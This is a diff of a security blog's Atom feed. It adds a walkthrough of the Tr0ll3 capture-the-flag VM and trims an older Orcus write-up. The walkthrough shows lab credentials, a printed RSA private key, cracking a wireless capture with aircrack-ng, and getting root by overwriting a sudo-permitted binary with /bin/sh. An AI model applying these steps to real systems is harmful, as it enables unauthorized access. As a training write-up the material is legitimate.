@@ -4,7 +4,7 @@
   <title><![CDATA[Category: writeups | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2019-06-09T21:54:05+03:00</updated>
+  <updated>2019-09-09T19:54:37+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,308 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[There be Tr0lls - Part 3]]></title>
+    <link href="http://chousensha.github.io/blog/2019/09/09/there-be-tr0lls-part-3/"/>
+    <updated>2019-09-09T19:35:37+03:00</updated>
+    <id>http://chousensha.github.io/blog/2019/09/09/there-be-tr0lls-part-3</id>
+    <content type="html"><![CDATA[<p>The Tr0ll is back with the 3rd machine in the series!</p>
+
+<!-- more -->
+
+
+<h2>start with credentials in plaintext</h2>
+
+<p>The start is atypical..the machine only has the SSH port open, and in the author description we are told to <code>start:here</code> for the login..so let&rsquo;s try to SSH with these credentials. It works and we are in right away.</p>
+
+<p><code>
+start@Tr0ll3:~$ ls
+bluepill  redpill
+</code></p>
+
+<p>If you take the bluepill, you are being taught the secrets of how to make a hacker waste time.</p>
+
+<p><code>
+start@Tr0ll3:~/bluepill$ cat awesome_work
+http://bfy.tw/ODa
+</code></p>
+
+<p>With the redpill, we find a password..or we&rsquo;re being trolled:</p>
+
+<p><code>
+start@Tr0ll3:~/redpill$ cat this_will_surely_work
+step2:Password1!
+</code></p>
+
+<p>Jumping straight into enumeration with LinEnum, we notice there are many potentially interesting users on the system:</p>
+
+<p><code>
+maleus
+wytshadow
+genphlux
+eagle
+</code></p>
+
+<p>When searching for world writable files, we find the following:</p>
+
+<p><code>
+-] Files not owned by user but writable by group:
+-rwxrwxrwx 1 root root 49962 Aug  2 00:23 /var/log/.dist-manage/wytshadow.cap
+-rwxrwxrwx 1 eagle russ 35737600 Aug  2 00:24 /.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt
+</code></p>
+
+<p>We also find possible credentials for the eagle user among the files owned by the start user:</p>
+
+<p><code>
+start@Tr0ll3:~$ cat /home/start/.../about_time
+eagle:oxxwJo
+</code></p>
+
+<p>I transferred the capture file to my machine, also checked the contents of that troll file, it was filled with blocks of strings like these:</p>
+
+<p><code>
+QBu4rIhKXJ
+DKbpcZQpO3
+T7JUfO0jjZ
+</code></p>
+
+<p>Before looking at the exfiltrated file, I switched to the user eagle with the above password.</p>
+
+<h2>Be the eagle &ndash; wireless traffic cracking</h2>
+
+<p>The packet capture file contains wireless traffic, so I thought about cracking it with aircrack-ng. For the first attempt, I fed it the gold_star.txt file as wordlist, and it found the passphrase in 5 minutes:</p>
+
+<p><code>
+aircrack-ng -w gold_star.txt wytshadow.cap
+[...]
+KEY FOUND! [ gaUoCe34t1 ]
+</code></p>
+
+<p>There was nothing particularly interesting from eagle&rsquo;s point of view, other than the sudo privilege for starting the vsftpd service:</p>
+
+<p>```
+User eagle may run the following commands on Tr0ll3:</p>
+
+<pre><code>(root) /usr/sbin/service vsftpd start
+</code></pre>
+
+<p>```</p>
+
+<p>We keep this option on the bench for now, since we have something else to work with. We know there&rsquo;s a wytshadow user, and the .cap file had the same name, so I used the key as password for this account and new user, new shell!</p>
+
+<h2>wytshadow and the Lynx</h2>
+
+<p>Inside the home directory we find a SUID executable:</p>
+
+<p><code>
+-rwsrwxrwx  1 genphlux  root      8566 Jun 17  2015 oohfun
+wytshadow@Tr0ll3:~$ file oohfun
+oohfun: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=309f4fec949b0e2eb3f6ec83ccadff89c553e397, not stripped
+</code></p>
+
+<p>If we run it, we see the string &ldquo;iM Cr@zY L1k3 AAA LYNX&rdquo; printed continuously on the screen. If we look in the strings of the file, we see a reference to a shell script:</p>
+
+<p><code>
+/lol/bin/run.sh -b 0.0.0.0
+</code></p>
+
+<p>If we look at that file, we see it does exactly what we saw earlier, printing the string in an infinite loop:</p>
+
+<p>```
+wytshadow@Tr0ll3:~$ cat /lol/bin/run.sh</p>
+
+<h1>!/bin/sh</h1>
+
+<p>while true;do echo &ldquo;iM Cr@zY L1k3 AAA LYNX&rdquo;; done
+```</p>
+
+<p>We don&rsquo;t have permissions to further enumerate the /lol directory. I checked the sudo privileges, and this user can start an Nginx server:</p>
+
+<p>```
+User wytshadow may run the following commands on Tr0ll3:</p>
+
+<pre><code>(root) /usr/sbin/service nginx start
+</code></pre>
+
+<p>```</p>
+
+<p>The server is listening on port 8080, but we get a 403 Forbidden error when trying to access it.</p>
+
+<p><code>
+roto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
+</code></p>
+
+<p>If we look in the Nginx configuration files, we find the server expects a user agent of Lynx, and now it all makes sense. Lynx is a CLI browser.</p>
+
+<p>```
+wytshadow@Tr0ll3:~$ cat /etc/nginx/sites-available/default
+if ($http_user_agent !~ &ldquo;Lynx*&rdquo;){</p>
+
+<pre><code>return 403;
+</code></pre>
+
+<p>```</p>
+
+<p>I already had it on Kali, so I used it to browse to the newly opened web server and was handed the credentials for the genphlux user:</p>
+
+<p><code>
+lynx http://192.168.159.143:8080/
+genphlux:HF9nd0cR!
+</code></p>
+
+<h2>genphlux &ndash; Unprotected SSH keys</h2>
+
+<p>Inside the home directory we immediately find the SSH private key of the maleus user!</p>
+
+<p><code>
+genphlux@Tr0ll3:~$ cat maleus
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAwz5Hwer48U1t/Qi9JveuO+Z7WQlnmhOOs/2pZ0he/OyVsEFv
+DsGib1wu/N8t+7h9JZK9x2GL33TXQBVCy6TxES90F1An+2DSza6lJPCyhcgK/DEp
+yxSVt32A+lFo+PQJV6QYZlpRkek0MjUw5y/E5qZwdBypC55C4QzgQBN3+Lnuhuk4
+u52xcK9/6/2N7JZCNYA21Tp1Uy9mty/65IT7OwKJd2rXp3O6rZYTD/vPl+Rt/LtN
+gA1DbDODq0NCmvcrZL+SafSj+MABA3LCERw01gA4RMdyxJU6hVfjeSKOdwDQOGWe
+eAVCL2GR/frwyf+rfN1kbpdw/RGXWWwVANMcaQIDAQABAoIBAGNudFztrZo2NK2I
+pcwSl0kqN+dAQuLU0vgXVw6ibL2iPxlkOYrqUi8kY0mk32YyrolUEhJYO0Ox3W1l
+Zn8PoTV/VUAKMlJzHOhi6PfHHSPEnNOSthYWhajM4cKZczxWC+v2RfbaSHBms45e
+SGl0inJskRiRAAZKswSp6gq334FrS6Dwy1tiKvzCfR3kLQghV5U/PhFZCsq3xvAw
+eXPx2toNtU2gYSGrKWTep+nAKM1neBxeZAujYuN4xJ5/Th2y0pyTvX9WEgzKPJ/G
+PlYZYCUAKPCbabYSuZckjeiN1aS52AIFedECBfAIezOr08Wx/bI/xCOgBxrQgPrK
+kRvlOYECgYEA5eCIEfdLhWdg3ltadYE0O5VAoXKrbxYWqSyw1Eyeqj0N1qD9Rsvg
+jIQJazV5JcVBIF54f/jlCJozR5s5AELrY0Z/krea1lF5ecOSUQE3tp94298xzO3g
+7BBe3g6pD56Cya/Vo0+YVQmAnBHLh6QIYvUUXXN2IyceT8fhEx5JA+sCgYEA2W4z
+KKMVAdPxKcjVks1zdGmVlj1RsUkakYuLWV3jQe2w1naJrc37Khy5eWZaRJhXqeBb
+1cvTMa+r/BF7jvItxglWoBJqXDxKI0a6KqWtloZL2ynoaBkAhR2btob6nSN63Bpg
+ZYJKY1B5yYbDHK4k6QT7atn2g6DAv/7sW6skj/sCgYA16WTAIek6TjZvr6kVacng
+N27C7mu6T8ncvzhxcc68SjlWnscHtYTiL40t8YqKCyrs9nr4OF0umUtxfbvujcM6
+syv0Ms9DeDQvFGjaSpjQYbIsjrnVP+zCMEyvc2y+1wQBXRWTiXVGbEYXVC0RkKzO
+2H+AMzX/pIr9Vvk4TJ//JQKBgFNJcy9NyO46UVbAJ49kQ6WEDFjQhEp0xkiaO3aw
+EC1g7yw3m+WH0X4AIsvt+QXtlSbtWkA7I1sU/7w+tiW7fu0tBpGqfDN4pK1+mjFb
+5XKTXttE4lF9wkU7Yjo42ib3QEivkd1QW05PtVcM2BBUZK8dyXDUrSkemrbw33j9
+xbOhAoGBAL8uHuAs68ki/BWcmWUUer7Y+77YI/FFm3EvP270K5yn0WUjDJXwHpuz
+Fg3n294GdjBtQmvyf2Wxin4rxl+1aWuj7/kS1/Fa35n8qCN+lkBzfNVA7f626KRA
+wS3CudSkma8StmvgGKIU5YcO8f13/3QB6PPBgNoKnF5BlFFQJqhK
+-----END RSA PRIVATE KEY-----
+</code></p>
+
+<p>I was curious about what was inside /lol, it appears to be a JBoss installation:</p>
+
+<p><code>
+genphlux@Tr0ll3:/lol$ ls
+bin  client  common  copyright.txt  docs  jar-versions.xml  JBossORG-EULA.txt  lgpl.html  lib  readme.html  server
+</code></p>
+
+<p>genphlux can also start an Apache server:</p>
+
+<p><code>
+User genphlux may run the following commands on Tr0ll3:
+(root) /usr/sbin/service apache2 start
+</code></p>
+
+<p>I started the server, also getting a 403 Forbidden, lynx or not. Moving on for now, I SSH'ed in as maleus with the found private key.</p>
+
+<h2>maleus &ndash; don&rsquo;t even bother</h2>
+
+<p>Inside his home we find another binary:</p>
+
+<p><code>
+maleus@Tr0ll3:~$ file dont_even_bother
+dont_even_bother: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=455a77b2503f19c1a09cbc9b66d513b2fa3af73c, not stripped
+</code></p>
+
+<p>This binary asks for a password:</p>
+
+<p>```
+maleus@Tr0ll3:~$ ./dont_even_bother</p>
+
+<p> Enter the password :
+das</p>
+
+<p> Wrong Password
+```</p>
+
+<p>And in the strings we find a message for finding the correct password probably:</p>
+
+<p><code>
+ Your reward is just knowing you did it! :-P
+</code></p>
+
+<p>This reward isn&rsquo;t really that enticing, so I didn&rsquo;t jump into reversing this, it might be a troll dead end. I continued looking through the home folder and found a possible password inside the <em>.viminfo</em> file:</p>
+
+<p>```</p>
+
+<h1>Registers:</h1>
+
+<p>&ldquo;"1 LINE    0
+ passwd
+"2  LINE    0
+ B<sup>slc8I</sup>$
+"3  LINE    0
+ passswd
+```</p>
+
+<p>In the .viminfo file you can find information that persists throughout vim runs. If you don&rsquo;t disable the vim logging, you can expect to find things you typed / pasted / edited, like passwords in this case. A useful blog that describes this in more detail is <a href="http://technotes.whw1.com/computer-related/development/programming/58-how-to-stop-vim-logging-info-into-viminfo">http://technotes.whw1.com/computer-related/development/programming/58-how-to-stop-vim-logging-info-into-viminfo</a></p>
+
+<p>The password belongs to maleus and now we can check his sudo privileges. We find out he can run the executable from earlier as root:</p>
+
+<p>```
+User maleus may run the following commands on Tr0ll3:</p>
+
+<pre><code>(root) /home/maleus/dont_even_bother
+</code></pre>
+
+<p>```</p>
+
+<p>From the strings, we already assume the executable itself is just a troll. However, maleus has write privileges over this file:</p>
+
+<p><code>
+maleus@Tr0ll3:~$ ls -l
+total 12
+-rwxrwxr-x 1 maleus maleus 8674 Jun 18  2015 dont_even_bother
+</code></p>
+
+<p>So we can just replace this useless binary with one that would give us a root shell:</p>
+
+<p>```
+maleus@Tr0ll3:~$ cat /bin/sh > dont_even_bother
+maleus@Tr0ll3:~$ sudo ./dont_even_bother
+[sudo] password for maleus:</p>
+
+<h1>cat /root/flag.txt</h1>
+
+<p>You are truly a Jedi!</p>
+
+<p>Twitter Proof:</p>
+
+<p>Pr00fThatTh3L33tHax0rG0tTheFl@g!!</p>
+
+<p>@Maleus21
+```</p>
+
+<p>This was another fun machine in the series. In the end, we trolled the troll again!</p>
+
+<p>```</p>
+
+<hr />
+
+<p>/ QOTD:                                  \
+|                                        |
+\ All I want is more than my fair share. /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[No Mercy]]></title>
@@ -686,7 +988,7 @@ Copyright &copy; 2005-2015 by Matteo Cantoni (www.nothink.org)</p>
 <p>  Host IP address               : 192.168.159.136
   Hostname                      : analoguepond
   Description                   : Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64
-  Contact                       : Eric Burdon <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x65;&#114;&#x69;&#99;&#x40;&#101;&#120;&#97;&#x6d;&#112;&#108;&#101;&#46;&#99;&#111;&#x6d;">&#101;&#x72;&#105;&#x63;&#64;&#x65;&#x78;&#x61;&#x6d;&#112;&#x6c;&#101;&#46;&#x63;&#x6f;&#x6d;</a>
+  Contact                       : Eric Burdon <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x65;&#114;&#105;&#99;&#x40;&#x65;&#120;&#x61;&#109;&#x70;&#x6c;&#x65;&#46;&#x63;&#111;&#x6d;">&#x65;&#114;&#x69;&#99;&#x40;&#x65;&#120;&#x61;&#109;&#112;&#108;&#x65;&#x2e;&#x63;&#111;&#x6d;</a>
   Location                      : There is a house in New Orleans they call it&hellip;
   Uptime snmp                   : 05:15:30.80
   Uptime system                 : 05:15:20.10
@@ -1182,7 +1484,7 @@ gpg: WARNING: message was not integrity protected
 gpg nleeson_key.gpg > nleeson_key
 chmod 600 nleeson</p>
 
-<h1>ssh -i nleeson <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#110;&#x6c;&#x65;&#x65;&#x73;&#x6f;&#x6e;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#x32;&#x32;&#46;&#x33;">&#110;&#x6c;&#101;&#x65;&#115;&#x6f;&#110;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#49;&#50;&#x32;&#46;&#x33;</a></h1>
+<h1>ssh -i nleeson <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#58;&#110;&#x6c;&#101;&#x65;&#x73;&#x6f;&#110;&#64;&#49;&#57;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#49;&#x32;&#x32;&#x2e;&#51;">&#110;&#x6c;&#x65;&#101;&#115;&#x6f;&#x6e;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#x31;&#50;&#x32;&#x2e;&#x33;</a></h1>
 
 <p>Enter passphrase for key &lsquo;nleeson&rsquo;:
 Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 4.4.0-57-generic x86_64)</p>
@@ -1491,7 +1793,7 @@ a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
 <p>Now we can SSH on the box:</p>
 
 <p>```
-ssh -i stinky_key <a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#x73;&#x74;&#x69;&#x6e;&#x6b;&#121;&#x40;&#x64;&#x65;&#x72;&#112;&#110;&#x73;&#x74;&#x69;&#x6e;&#107;&#46;&#x6c;&#111;&#99;&#x61;&#108;">&#x73;&#116;&#x69;&#110;&#x6b;&#121;&#x40;&#x64;&#x65;&#114;&#112;&#x6e;&#x73;&#116;&#105;&#110;&#107;&#x2e;&#108;&#111;&#99;&#97;&#x6c;</a>
+ssh -i stinky_key <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#115;&#116;&#x69;&#x6e;&#x6b;&#121;&#x40;&#x64;&#x65;&#x72;&#x70;&#110;&#x73;&#116;&#105;&#x6e;&#x6b;&#46;&#108;&#111;&#99;&#x61;&#x6c;">&#x73;&#116;&#105;&#x6e;&#x6b;&#x79;&#64;&#100;&#101;&#114;&#x70;&#x6e;&#x73;&#x74;&#105;&#x6e;&#x6b;&#x2e;&#108;&#x6f;&#99;&#97;&#108;</a>
 Ubuntu 14.04.5 LTS</p>
 
 <pre><code>                   ,~~~~~~~~~~~~~..
@@ -1543,7 +1845,7 @@ pass1=derpderpderpderpderpderpderp
 
 <p>```
 mrderp@DeRPnStiNK:~$ cat Desktop/helpdesk.log
-From: Help Desk <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#104;&#x65;&#108;&#112;&#x64;&#x65;&#115;&#107;&#64;&#x64;&#x65;&#x72;&#112;&#110;&#x73;&#116;&#x69;&#x6e;&#x6b;&#x2e;&#x6c;&#111;&#x63;&#x61;&#x6c;">&#x68;&#101;&#108;&#x70;&#100;&#101;&#115;&#107;&#x40;&#100;&#x65;&#114;&#112;&#110;&#x73;&#x74;&#x69;&#110;&#107;&#x2e;&#x6c;&#111;&#99;&#x61;&#108;</a>
+From: Help Desk <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#58;&#104;&#x65;&#108;&#112;&#x64;&#101;&#x73;&#x6b;&#64;&#x64;&#x65;&#x72;&#112;&#110;&#115;&#x74;&#x69;&#x6e;&#107;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#108;">&#104;&#x65;&#108;&#112;&#x64;&#101;&#115;&#107;&#x40;&#100;&#x65;&#x72;&#112;&#110;&#x73;&#x74;&#x69;&#110;&#107;&#46;&#108;&#x6f;&#x63;&#97;&#x6c;</a>
 Date: Thu, Aug 23, 2017 at 1:29 PM
 Subject: sudoers ISSUE=242 PROJ=26
 To: Derp, Mr (mrderp) [C]
@@ -1859,7 +2161,7 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof
 <p>And the SSH user is orwell. So let&rsquo;s copy the private key to our machine and try to SSH in as orwell:</p>
 
 <p>```
-ssh -i id_ed25519 <a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#111;&#114;&#119;&#101;&#108;&#108;&#64;&#x31;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#x31;&#x35;&#57;&#46;&#49;&#51;&#x32;">&#x6f;&#114;&#x77;&#101;&#108;&#108;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#49;&#53;&#x39;&#46;&#49;&#x33;&#50;</a>
+ssh -i id_ed25519 <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x6f;&#x72;&#x77;&#101;&#x6c;&#108;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#49;&#53;&#57;&#46;&#x31;&#x33;&#x32;">&#x6f;&#114;&#119;&#101;&#x6c;&#x6c;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#x31;&#x35;&#57;&#x2e;&#49;&#x33;&#50;</a>
 Welcome to</p>
 
 <hr />
@@ -1877,7 +2179,7 @@ if you run into any issue you can find me on Twitter: @dhn_
 or feel free to write me a mail to:</p>
 
 <ul>
-<li>Email: <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#58;&#100;&#x68;&#110;&#64;&#122;&#101;&#x72;&#48;&#x2d;&#x64;&#97;&#x79;&#x2e;&#112;&#x77;">&#x64;&#104;&#x6e;&#x40;&#x7a;&#101;&#x72;&#x30;&#45;&#100;&#97;&#121;&#46;&#112;&#119;</a></li>
+<li>Email: <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#100;&#x68;&#x6e;&#64;&#122;&#x65;&#x72;&#x30;&#x2d;&#x64;&#97;&#121;&#46;&#112;&#x77;">&#x64;&#104;&#x6e;&#64;&#122;&#101;&#114;&#x30;&#45;&#x64;&#97;&#121;&#x2e;&#x70;&#119;</a></li>
 <li>GPG key: 0x2641123C</li>
 <li>GPG fingerprint: 4E3444A11BB780F84B58E8ABA8DD99472641123C</li>
 </ul>
@@ -1986,7 +2288,7 @@ YES!! You did it :&ndash;). Congratulations!</p>
 
 <p>I hope you enjoyed this CTF VM.</p>
 
-<p>Drop me a line on twitter @dhn_, or via email <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x64;&#x68;&#110;&#64;&#x7a;&#x65;&#x72;&#x30;&#45;&#x64;&#97;&#121;&#46;&#x70;&#119;">&#100;&#104;&#110;&#64;&#x7a;&#101;&#x72;&#x30;&#45;&#100;&#x61;&#x79;&#x2e;&#x70;&#119;</a></p>
+<p>Drop me a line on twitter @dhn_, or via email <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x64;&#x68;&#110;&#x40;&#x7a;&#101;&#x72;&#x30;&#45;&#100;&#x61;&#x79;&#46;&#112;&#x77;">&#x64;&#x68;&#110;&#64;&#122;&#101;&#x72;&#x30;&#x2d;&#x64;&#x61;&#x79;&#46;&#x70;&#x77;</a></p>
 
 <p>Here is your flag: flag2{60d14feef575bacf5fd8eb06ec7cd8e7}
 ```</p>
@@ -2008,363 +2310,6 @@ YES!! You did it :&ndash;). Congratulations!</p>
 <p>/ Your motives for doing whatever good \
 | deed you may have in mind will be    |
 \ misinterpreted by somebody.          /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Hackfest 2016 Orcus]]></title>
-    <link href="http://chousensha.github.io/blog/2019/04/07/hackfest-2016-orcus/"/>
-    <updated>2019-04-07T22:20:06+03:00</updated>
-    <id>http://chousensha.github.io/blog/2019/04/07/hackfest-2016-orcus</id>
-    <content type="html"><![CDATA[<p>Today&rsquo;s VM is the third machine in the Hackfest series:</p>
-
-<blockquote><p>This is a vulnerable machine i created for the Hackfest 2016 CTF <a href="http://hackfest.ca/">http://hackfest.ca/</a></p>
-
-<p>Difficulty : Hard</p>
-
-<p>Tips:</p>
-
-<p>If youre stuck enumerate more! Seriously take each service running on the system and enumerate them more!</p>
-
-<p>Goals: This machine is intended to take a lot of enumeration and understanding of Linux system.</p>
-
-<p>There are 4 flags on this machine 1. Get a shell 2. Get root access 3. There is a post exploitation flag on the box 4. There is something on
-this box that is different from the others from this series (Quaoar and Sedna) find why its different</p></blockquote>
-
-<!-- more -->
-
-
-<p><code>
-PORT      STATE SERVICE     VERSION
-22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)
-|   256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)
-|_  256 c9:a9:c9:0d:df:7c:fc:a7:da:87:ef:d3:38:c3:f2:a6 (ED25519)
-53/tcp    open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)
-| dns-nsid:
-|_  bind.version: 9.10.3-P4-Ubuntu
-80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
-| http-robots.txt: 30 disallowed entries (15 shown)
-| /exponent.js.php /exponent.js2.php /exponent.php
-| /exponent_bootstrap.php /exponent_constants.php /exponent_php_setup.php
-| /exponent_version.php /getswversion.php /login.php /overrides.php
-| /popup.php /selector.php /site_rss.php /source_selector.php
-|_/thumb.php
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Site doesn't have a title (text/html).
-110/tcp   open  pop3        Dovecot pop3d
-|_pop3-capabilities: AUTH-RESP-CODE CAPA UIDL SASL RESP-CODES STLS PIPELINING TOP
-|_ssl-date: TLS randomness does not represent time
-111/tcp   open  rpcbind     2-4 (RPC #100000)
-| rpcinfo:
-|   program version   port/proto  service
-|   100000  2,3,4        111/tcp  rpcbind
-|   100000  2,3,4        111/udp  rpcbind
-|   100003  2,3,4       2049/tcp  nfs
-|   100003  2,3,4       2049/udp  nfs
-|   100005  1,2,3      36199/tcp  mountd
-|   100005  1,2,3      38727/udp  mountd
-|   100021  1,3,4      41463/tcp  nlockmgr
-|   100021  1,3,4      43317/udp  nlockmgr
-|   100227  2,3         2049/tcp  nfs_acl
-|_  100227  2,3         2049/udp  nfs_acl
-139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-143/tcp   open  imap        Dovecot imapd
-|_imap-capabilities: have more SASL-IR OK LOGIN-REFERRALS ENABLE capabilities Pre-login LOGINDISABLEDA0001 STARTTLS IDLE listed ID LITERAL+ IMAP4rev1 post-login
-|_ssl-date: TLS randomness does not represent time
-443/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)
-|   256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)
-|_  256 c9:a9:c9:0d:df:7c:fc:a7:da:87:ef:d3:38:c3:f2:a6 (ED25519)
-445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
-993/tcp   open  ssl/imaps?
-|_ssl-date: TLS randomness does not represent time
-995/tcp   open  ssl/pop3s?
-|_ssl-date: TLS randomness does not represent time
-2049/tcp  open  nfs_acl     2-3 (RPC #100227)
-36199/tcp open  mountd      1-3 (RPC #100005)
-41463/tcp open  nlockmgr    1-4 (RPC #100021)
-54301/tcp open  mountd      1-3 (RPC #100005)
-54471/tcp open  mountd      1-3 (RPC #100005)
-</code></p>
-
-<p>The web server greets us with a familiar planet image. In the background, I started some Samba enumeration, but didn&rsquo;t find anything interesting:</p>
-
-<p>```
-smbmap -H 192.168.159.131
-[+] Finding open SMB ports&hellip;.
-[+] Guest SMB session established on 192.168.159.131&hellip;
-[+] IP: 192.168.159.131:445 Name: 192.168.159.131</p>
-
-<pre><code>Disk                                                    Permissions
-----                                                    -----------
-print$                                              NO ACCESS
-IPC$                                                NO ACCESS
-</code></pre>
-
-<p>```</p>
-
-<p>I prefer to leave the web server for last when there are more vectors available, so before further poking at it, I also checked the if something is shared via the NFS:</p>
-
-<p><code>
-showmount -e 192.168.159.131
-Export list for 192.168.159.131:
-/tmp *
-</code></p>
-
-<p>Let&rsquo;s see what we have there:</p>
-
-<p><code>
-mount -t nfs 192.168.159.131:/tmp /mnt
-root@deck:/mnt# ls -alh
-total 76K
-drwxrwxrwt 10 root root 4.0K Apr  3  2019 .
-drwxr-xr-x 19 root root  36K Mar 15 08:27 ..
-drwxrwxrwt  2 root root 4.0K Apr  3  2019 .font-unix
-drwxrwxrwt  2 root root 4.0K Apr  3  2019 .ICE-unix
-drwx------  3 root root 4.0K Apr  3  2019 systemd-private-86f79ff31b254446ada5e9ff21595778-dovecot.service-SEiaO9
-drwx------  3 root root 4.0K Apr  3  2019 systemd-private-86f79ff31b254446ada5e9ff21595778-systemd-timesyncd.service-2AJ3nv
-drwxrwxrwt  2 root root 4.0K Apr  3  2019 .Test-unix
-drwx------  2 root root 4.0K Apr  3  2019 vmware-root
-drwxrwxrwt  2 root root 4.0K Apr  3  2019 .X11-unix
-drwxrwxrwt  2 root root 4.0K Apr  3  2019 .XIM-unix
-</code></p>
-
-<p>I looked around, but didn&rsquo;t find anything to continue from, so back to the web server!</p>
-
-<p>Nmap reported lots of entries in the robots.txt file, so let&rsquo;s have a look:</p>
-
-<p>```
-User-agent: *
-Crawl-delay: 5</p>
-
-<h1>@@@@@@   @@@@@@@    @@@@@@@  @@@  @@@   @@@@@@</h1>
-
-<h1>@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@</h1>
-
-<h1>@@!  @@@  @@!  @@@  !@@       @@!  @@@  !@@</h1>
-
-<h1>!@!  @!@  !@!  @!@  !@!       !@!  @!@  !@!</h1>
-
-<h1>@!@  !@!  @!@!!@!   !@!       @!@  !@!  !!@@!!</h1>
-
-<h1>!@!  !!!  !!@!@!    !!!       !@!  !!!   !!@!!!</h1>
-
-<h1>!!:  !!!  !!: :!!   :!!       !!:  !!!       !:!</h1>
-
-<h1>:!:  !:!  :!:  !:!  :!:       :!:  !:!      !:!</h1>
-
-<h1>::::: ::  ::   :::   ::: :::  ::::: ::  :::: ::</h1>
-
-<h1>: :  :    :   : :   :: :: :   : :  :   :: : :</h1>
-
-<p>Disallow: /exponent.js.php
-Disallow: /exponent.js2.php
-Disallow: /exponent.php
-Disallow: /exponent_bootstrap.php
-Disallow: /exponent_constants.php
-Disallow: /exponent_php_setup.php
-Disallow: /exponent_version.php
-Disallow: /getswversion.php
-Disallow: /login.php
-Disallow: /overrides.php
-Disallow: /popup.php
-Disallow: /selector.php
-Disallow: /site_rss.php
-Disallow: /source_selector.php
-Disallow: /thumb.php
-Disallow: /ABOUT.md
-Disallow: /CHANGELOG.md
-Disallow: /CREDITS.md
-Disallow: /INSTALLATION.md
-Disallow: /LICENSE
-Disallow: /README.md
-Disallow: /RELEASE.md
-Disallow: /TODO.md
-Disallow: /cgi-bin/
-Disallow: /cart/
-Disallow: /login/
-Disallow: /users/
-Disallow: /files/
-Disallow: /tmp/
-Disallow: /search/</p>
-
-<h1>Sitemap: <a href="http://www.mysite.com/sitemap.xml">http://www.mysite.com/sitemap.xml</a></h1>
-
-<p>```</p>
-
